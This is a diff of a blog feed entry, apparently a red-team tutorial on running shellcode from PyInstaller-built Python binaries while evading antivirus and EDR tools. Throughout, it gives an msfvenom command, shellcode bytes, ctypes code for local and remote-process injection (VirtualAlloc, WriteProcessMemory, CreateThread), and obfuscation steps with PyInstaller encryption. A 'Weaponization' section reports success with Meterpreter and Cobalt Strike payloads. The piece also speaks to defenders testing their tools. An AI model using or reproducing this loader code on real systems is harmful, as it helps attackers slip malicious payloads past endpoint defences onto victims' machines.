-&lt;p&gt;In this post, I’m going to review a few Python 3 shellcode injection techniques that are pretty well known, and tie in some other neat tricks to get around AV to execute shellcode. I’m hoping to give Red Teamers/Pentesters a new set of ideas for shellcode execution/AV evasion, and to give Defenders something to test in their own environment.&lt;/p&gt;
+&lt;p&gt;In this post, I’m going to review a few Python 3 shellcode injection techniques that are pretty well known, and tie in some other neat tricks to get around AV/EDR tools to execute shellcode. I’m hoping to give Red Teamers/Pentesters a new set of ideas for shellcode execution/AV evasion, and to give Defenders something to test in their own environment.&lt;/p&gt;
 
 &lt;p&gt;Before getting started, I should mention a few things:&lt;/p&gt;
 &lt;ul&gt;
   &lt;li&gt;These techniques are not novel. I’ll include the references I used, but there are many examples of Python shellcode execution.&lt;/li&gt;
   &lt;li&gt;The generated binaries are BIG. There are practical uses, but I wouldn’t consider dropping a 10MB exe to a host ‘stealthy’ in most cases. But hey, a shell is a shell!&lt;/li&gt;
-  &lt;li&gt;This technique WILL bypass some of the big name AV vendors. I recommend that Defenders run a variant of this in their environment to test their AV.&lt;/li&gt;
+  &lt;li&gt;This technique WILL bypass some of the big name AV/EDR. I recommend that Defenders run a variant of this in their environment to test their AV/EDR.&lt;/li&gt;
   &lt;li&gt;&lt;strong&gt;As with all of my code/documentation/articles, this is not to be used maliciously. Use this information for good, and follow all laws of your Nation/State/County/City/Home.&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
@@ -34,7 +737,7 @@
 
 &lt;h3 id=&quot;development-environment&quot;&gt;Development Environment&lt;/h3&gt;
 
-&lt;p&gt;I needed a few common tools to develop and test these techniques, and so will you. I’ll include what I used, why I needed it, and some resources below.&lt;/p&gt;
+&lt;p&gt;You’re going to need a few things to get started. I’ll include what you need, why you need it, and some resources below.&lt;/p&gt;
 &lt;ul&gt;
   &lt;li&gt;Windows 10 VM: Used for testing the launcher script, running Pyinstaller.&lt;/li&gt;
   &lt;li&gt;Kali Linux VM: Development host for the encryption/encoding script, hosting the shellcode, generating the shellcode.&lt;/li&gt;
@@ -46,15 +749,15 @@
 
 &lt;p&gt;Resources:&lt;/p&gt;
 &lt;ul&gt;
-  &lt;li&gt;Legit, temporary Windows 10 VMs: &lt;a href=&quot;https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/&quot;&gt;https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;Kali Linux: &lt;a href=&quot;https://www.kali.org/&quot;&gt;https://www.kali.org/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;Python 3: &lt;a href=&quot;https://www.python.org/downloads/&quot;&gt;https://www.python.org/downloads/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;Pyinstaller: &lt;a href=&quot;https://www.pyinstaller.org/&quot;&gt;https://www.pyinstaller.org/&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Legit, temporary Windows 10 VMs: &lt;a href=&quot;https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/&quot;&gt;Windows 10&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Kali Linux: https://www.kali.org/&lt;/li&gt;
+  &lt;li&gt;Python 3: https://www.python.org/downloads/&lt;/li&gt;
+  &lt;li&gt;Pyinstaller: https://www.pyinstaller.org/&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;h3 id=&quot;generating-shellcode&quot;&gt;Generating Shellcode&lt;/h3&gt;
 
-&lt;p&gt;For test purposes, I used generic Windows shellcode for x64 architecture generated using msfvenom. I’ve also tested some other common shellcodes with these techniques.&lt;/p&gt;
+&lt;p&gt;For test purposes, generate generic Windows shellcode for x64 architecture using msfvenom.&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -a x64 --platform windows -p windows/x64/exec cmd=calc.exe -f raw -o calc_x64.bin
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -126,13 +829,13 @@ shellcode += b&quot;\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;shellcode.encode('latin-1')
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;This was a neat little trick to get this running, found &lt;a href=&quot;https://www.christophertruncer.com/shellcode-manipulation-and-injection-in-python-3/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;This was a neat little trick to get this running, found here: &lt;a href=&quot;https://www.christophertruncer.com/shellcode-manipulation-and-injection-in-python-3/&quot;&gt;Latin1&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;These issues won’t apply for how I will run shellcode in this article, but it’s something very important to keep in mind when running shellcode that has been stored in the script itself. Always stay aware of your bytes/string conversions.&lt;/p&gt;
 
 &lt;h2 id=&quot;encryption-encoding&quot;&gt;Encryption, Encoding&lt;/h2&gt;
 
-&lt;p&gt;Back to the fun stuff. The first order of business when getting around AV is getting your shellcode into memory without getting caught. There are two main ways that I can see to do this:&lt;/p&gt;
+&lt;p&gt;Back to the fun stuff. The first order of business when getting around AV/EDR is getting your shellcode into memory without getting caught. There are two main ways that I can see to do this:&lt;/p&gt;
 &lt;ol&gt;
   &lt;li&gt;Store the shellcode (in some form) within the Python script/bin.&lt;/li&gt;
   &lt;li&gt;Load the shellcode (in some form) into memory from elsewhere.&lt;/li&gt;
@@ -251,13 +954,13 @@ shellcode = aes_decrypt(ciphertext, key, iv)
 
 &lt;p&gt;Shoutout to the always crafty gentlemen/women of Black Hills Information Security. I was able to get this working after long await thanks to the talk and source code they put out.&lt;/p&gt;
 
-&lt;p&gt;Code Referenced: &lt;a href=&quot;https://github.com/ustayready/python-pentesting/blob/master/pyinjector.py&quot;&gt;https://github.com/ustayready/python-pentesting/blob/master/pyinjector.py&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Code Referenced: &lt;a href=&quot;https://github.com/ustayready/python-pentesting/blob/master/pyinjector.py&quot;&gt;Reference Code&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;Author: &lt;a href=&quot;https://github.com/ustayready&quot;&gt;Mike Feltch&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Author: Mike Feltch (https://github.com/ustayready)&lt;/p&gt;
 
 &lt;h3 id=&quot;the-ctypes-library&quot;&gt;The ctypes Library&lt;/h3&gt;
 
-&lt;p&gt;The ctypes library offers a few things that will be useful for executing the shellcode. First, it allows us to load the kernel32 DLL, giving me access to the functions that I need within that DLL. It also allows me to load various datatypes useful when calling Windows API functions.&lt;/p&gt;
+&lt;p&gt;The ctypes library offers a few things that will be useful for executing the shellcode. First, it allows us to load the kernel32 DLL, giving us access to the functions that we need within that DLL. It also allows us to load various datatypes useful when calling Windows API functions.&lt;/p&gt;
 
 &lt;p&gt;Import the libraries.&lt;/p&gt;
 
@@ -267,7 +970,7 @@ import ctypes.wintypes
 
 &lt;h3 id=&quot;defining-the-kernel32-functions&quot;&gt;Defining the kernel32 Functions&lt;/h3&gt;
 
-&lt;p&gt;Without defining argtypes for the various kernel functions that I’m using, there will eventually be some odd type-related errors (see below).&lt;/p&gt;
+&lt;p&gt;Without defining argtypes for the various kernel functions that we’re using, there will eventually be some odd type-related errors (see below).&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/python_injection_2.PNG&quot; alt=&quot;Error&quot; /&gt;&lt;/p&gt;
 
@@ -298,33 +1001,33 @@ VirtualProtect.restype = ctypes.wintypes.BOOL
 
 &lt;p&gt;References:&lt;/p&gt;
 &lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://docs.python.org/3/library/ctypes.html&quot;&gt;https://docs.python.org/3/library/ctypes.html&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc&quot;&gt;https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread&quot;&gt;https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect&quot;&gt;https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;https://docs.python.org/3/library/ctypes.html&lt;/li&gt;
+  &lt;li&gt;https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc&lt;/li&gt;
+  &lt;li&gt;https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread&lt;/li&gt;
+  &lt;li&gt;https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;h3 id=&quot;calling-the-kernel32-functions&quot;&gt;Calling the kernel32 Functions&lt;/h3&gt;
 
 &lt;p&gt;Now it’s time to actually execute the shellcode. This involves 5 steps.&lt;/p&gt;
 
-&lt;p&gt;Allocation of memory using the VirtualAlloc function, ensuring the memory has the read/write/execute protection option. Read/write will not work. (&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc&quot;&gt;Reference&lt;/a&gt;).&lt;/p&gt;
+&lt;p&gt;Allocation of memory using the VirtualAlloc function, ensuring the memory has the read/write/execute protection option. Read/write will not work. (https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc).&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;memptr = VirtualAlloc(0, len(shellcode), MEM_COMMIT, PAGE_READWRITE_EXECUTE)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Copy memory contents from the shellcode memory location to the memory location allocated above using RtlMoveMemory (&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory&quot;&gt;Reference&lt;/a&gt;).&lt;/p&gt;
+&lt;p&gt;Copy memory contents from the shellcode memory location to the memory location allocated above using RtlMoveMemory (https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory).&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctypes.windll.kernel32.RtlMoveMemory(memptr, shellcode, len(shellcode))
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Change the allocated memory region’s protection option to read/execute. This is not necessary, but will make execution of the shellcode less ‘suspicious’. Check out the list of memory protection constants &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Change the allocated memory region’s protection option to read/execute. This is not necessary, but will make execution of the shellcode less ‘suspicious’. Check out the list of memory protection constants here: https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants.&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctypes.windll.kernel32.VirtualProtect(memptr, len(shellcode), PAGE_READ_EXECUTE, 0)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Create a thread that executes the shellcode within the context of the current process (&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread&quot;&gt;Reference&lt;/a&gt;).&lt;/p&gt;
+&lt;p&gt;Create a thread that executes the shellcode within the context of the current process (https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread).&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;thread = ctypes.windll.kernel32.CreateThread(0, 0, memptr, 0, 0, 0)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Cause the current thread to wait for completed execution of the previously created thread (&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject&quot;&gt;Reference&lt;/a&gt;).&lt;/p&gt;
+&lt;p&gt;Cause the current thread to wait for completed execution of the previously created thread (https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject).&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctypes.windll.kernel32.WaitForSingleObject(thread, 0xFFFFFFFF)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -344,7 +1047,7 @@ VirtualProtect.restype = ctypes.wintypes.BOOL
 
 &lt;h3 id=&quot;finding-a-pid&quot;&gt;Finding a PID&lt;/h3&gt;
 
-&lt;p&gt;There are a few ways to find running processes that the current user has read/write/execute access to. The easiest ways are to use either the Python &lt;a href=&quot;https://psutil.readthedocs.io/en/release-3.2.2/&quot;&gt;psutil&lt;/a&gt; or &lt;a href=&quot;https://pypi.org/project/WMI/&quot;&gt;wmi&lt;/a&gt; library. I’ll demonstrate using psutil, but either are fine.&lt;/p&gt;
+&lt;p&gt;There are a few ways to find running processes that the current user has read/write/execute access to. The easiest ways are to use either the Python psutil (https://psutil.readthedocs.io/en/release-3.2.2/) or wmi (https://pypi.org/project/WMI/) library. I’ll demonstrate using psutil, but either are fine.&lt;/p&gt;
 
 &lt;p&gt;Import methods to list running processes and retrieve username running the Launcher.&lt;/p&gt;
 
@@ -379,7 +1082,7 @@ my_pid = None
                 break
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;At this point, I have a PID for a process that I can (most likely) inject shellcode into.&lt;/p&gt;
+&lt;p&gt;At this point, I have a PID for a process that we can (most likely) inject shellcode into.&lt;/p&gt;
 
 &lt;h3 id=&quot;defining-the-kernel32-functions-1&quot;&gt;Defining the kernel32 Functions&lt;/h3&gt;
 
@@ -414,22 +1117,22 @@ WriteProcessMemory.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.LPVOID, c
 WriteProcessMemory.restype = ctypes.wintypes.BOOL
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;You should notice that these functions look similar to those defined for the previous method. The functions ending in ‘ex’ serve similar purposes as their counterparts used previously, but act on a remote process. There are also a few functions included here to handle (heh…) remote processes. Once again, I’ll provide a brief explanation of these functions, but check out the references below.&lt;/p&gt;
+&lt;p&gt;You should notice that these functions look similar to those defined for the previous method. The functions ending in ‘ex’ serve similar perposes as their counterparts used previously, but act on a remote process. There are also a few functions included here to handle (heh…) remote processes. Once again, I’ll provide a brief explanation of these functions, but check out the references below.&lt;/p&gt;
 
 &lt;p&gt;References:&lt;/p&gt;
 &lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory&quot;&gt;https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread&quot;&gt;https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess&quot;&gt;https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex&quot;&gt;https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex&quot;&gt;https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory&lt;/li&gt;
+  &lt;li&gt;https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread&lt;/li&gt;
+  &lt;li&gt;https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess&lt;/li&gt;
+  &lt;li&gt;https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex&lt;/li&gt;
+  &lt;li&gt;https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;h3 id=&quot;calling-the-kernel32-functions-1&quot;&gt;Calling the kernel32 Functions&lt;/h3&gt;
 
 &lt;p&gt;With the functions defined, it’s time to execute the shellcode.&lt;/p&gt;
 
-&lt;p&gt;First, I need to obtain a handle for the target process with the PROCESS_VM_WRITE and PROCESS_VM_OPERATION access rights (&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights&quot;&gt;Reference&lt;/a&gt;). A handle is basically an identifier for the process in integer format used across Windows API functions. Note that the PID found earlier is passed here.&lt;/p&gt;
+&lt;p&gt;First, I need to obtain a handle for the target process with the PROCESS_VM_WRITE and PROCESS_VM_OPERATION access rights (see: https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights). A handle is basically an identifier for the process in integer format used across Windows API functions. Note that the PID found earlier is passed here.&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;handle = OpenProcess(0x00028, False, my_pid)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -441,7 +1144,7 @@ WriteProcessMemory.restype = ctypes.wintypes.BOOL
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;result = WriteProcessMemory(handle, memptr, sc, len(sc), 0)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Change protection of the allocated memory region to Read/Execute (&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants&quot;&gt;Reference&lt;/a&gt;). There is no need for the Write attribute since we’ve already written the shellcode to this region.&lt;/p&gt;
+&lt;p&gt;Change protection of the allocated memory region to Read/Execute (see: https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants). There is no need for the Write attribute since we’ve already written the shellcode to this region.&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;result = VirtualProtectEx(handle, memptr, len(sc), 0x20, 0)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -482,13 +1185,13 @@ WriteProcessMemory.restype = ctypes.wintypes.BOOL
 .\Launcher.exe
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;You should have gotten a calc.exe if you’re following along.&lt;/p&gt;
+&lt;p&gt;You should have gotten a calc.exe.&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Pyinstalled binaries are OS specific. You should compile the binary on the same OS version/architecture that you are targeting.&lt;/p&gt;
+&lt;p&gt;Note: Pyinstalled binaries are OS specific. You should compile the binary on the same OS version/architecture that you are targeting.&lt;/p&gt;
 
 &lt;h2 id=&quot;obfuscating-the-python-code&quot;&gt;Obfuscating the Python Code&lt;/h2&gt;
 
-&lt;p&gt;One of the downsides of running Pyinstalled binaries on a target is that the source Python scripts aren’t truly ‘compiled’. Pyinstaller includes compiled .pyc files within the generated bundle, which can be extracted and analyzed to reveal the original Python code. This is a problem for Offensive teams, because it can allow even unskilled analysts to see the Launcher logic. For Defenders looking to test out analyzing Pyinstalled binaries, &lt;a href=&quot;https://github.com/countercept/python-exe-unpacker&quot;&gt;check this out&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;One of the downsides of running Pyinstalled binaries on a target is that the source Python scripts aren’t truly ‘compiled’. Pyinstaller includes compiled .pyc files within the generated bundle, which can be extracted and analyzed to reveal the original Python code. This is a problem for Offensive teams, because it can allow even unskilled analysts to see the Launcher logic. For Defenders looking to test out analyzing Pyinstalled binaries, check this out: https://github.com/countercept/python-exe-unpacker.&lt;/p&gt;
 
 &lt;p&gt;For Offensive folks looking to further defend against Defenders/AV/EDR, keep reading…&lt;/p&gt;
 
@@ -573,7 +1276,7 @@ if __name__ == '__main__':
 
 &lt;h3 id=&quot;pyinstaller-encryption&quot;&gt;PyInstaller Encryption&lt;/h3&gt;
 
-&lt;p&gt;Another technique to throw analysts and AV off your trail is using PyInstaller’s –key option. This will encrypt the Python bytecode using a key passed to this command line parameter.&lt;/p&gt;
+&lt;p&gt;Another technique to throw analysts and AV/EDR off your trail is using PyInstaller’s –key option. This will encrypt the Python bytecode using a key passed to this command line parameter.&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pyinstaller.exe --key=mypassword123456 --onefile .\Launcher.py
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -582,7 +1285,7 @@ if __name__ == '__main__':
 
 &lt;h2 id=&quot;weaponization&quot;&gt;Weaponization&lt;/h2&gt;
 
-&lt;p&gt;These techniques can be used to bypass various AV tools when running shellcode. Thus far, I’ve tested this with generic Windows command execution shellcodes, Meterpreter shells, and CobaltStrike beacon shellcode with success. While these techniques work, I’ve only touched the surface, and I certainly haven’t provided the best code examples. I can see a lot of cool ways to ‘weaponize’ this for use in a Campaign, notably:&lt;/p&gt;
+&lt;p&gt;These techniques can be used to bypass various AV/EDR tools when running shellcode. Thus far, I’ve tested this with generic Windows command execution shellcodes, Meterpreter shells, and CobaltStrike beacon shellcode with success. While these techniques work, I’ve only touched the surface, and I certainly haven’t provided the best code examples. I can see a lot of cool ways to ‘weaponize’ this for use in a Campaign, notably:&lt;/p&gt;
 &lt;ul&gt;
   &lt;li&gt;Creating a script to encrypt/encode/format the shellcode in various ways&lt;/li&gt;
   &lt;li&gt;Creating a script to populate a launcher template with this information&lt;/li&gt;
@@ -597,6 +1300,6 @@ if __name__ == '__main__':
 
 &lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
 
-&lt;p&gt;For the Offensive folks, I hope I’ve given you some good ideas on getting shellcode around around AV tools using Python. For such an old trick, it really stands up well. For the Defensive folks, I recommend taking a deeper look at these types of binaries. I can’t foresee many situations where they would be very useful, but there are a few. If new ways of executing Python scripts on Windows (Ironpython?), I can can imagine the use of python for shellcode execution will become more popular.&lt;/p&gt;
+&lt;p&gt;For the Offensive folks, I hope I’ve given you some good ideas on getting shellcode around around AV/EDR tools using Python. For such an old trick, it really stands up well. For the Defensive folks, I recommend taking a deeper look at these types of binaries. I can’t foresee many situations where they would be very useful, but there are a few. If new ways of executing Python scripts on Windows (Ironpython?), I can can imagine the use of python for shellcode execution will become more popular.&lt;/p&gt;
 
-&lt;p&gt;Thanks for reading.&lt;/p&gt;</content><author><name>Mike Music</name></author><summary type="html">Antivirus (AV) has advanced a lot, even in the short years that I’ve spent attempting to evade it. Tricks that I’ve used 2 years ago to get a shell on a endpoint just don’t work anymore. Because of this, I’ve had to resort to trying different methods of shellcode execution on hosts. One thing I’ve noticed is that some common AV tools fail to detect shellcode injection from Pyinstalled binaries. I don’t have a solid explanation for this, but I do have some theories based on the scarce information available on detection logic for specific AV/EDR.</summary></entry></feed>
+&lt;p&gt;Thanks for reading.&lt;/p&gt;</content><author><name>Mike Music</name></author><summary type="html">Antivirus (AV) and Endpoint Detection and Response (EDR) tools have gotten a lot more advanced in recent years. Tricks that I’ve used 2 years ago to get a shell on a typical endpoint just don’t work anymore. Because of this, I’ve had to resort to trying different methods of shellcode execution on hosts. One thing that I’ve noticed is that some common AV/EDR tools fail to detect shellcode injection from Pyinstalled binaries. I don’t have a solid explanation for this, but I do have some theories based on the scarce information available on detection logic for specific AV/EDR.</summary></entry></feed>
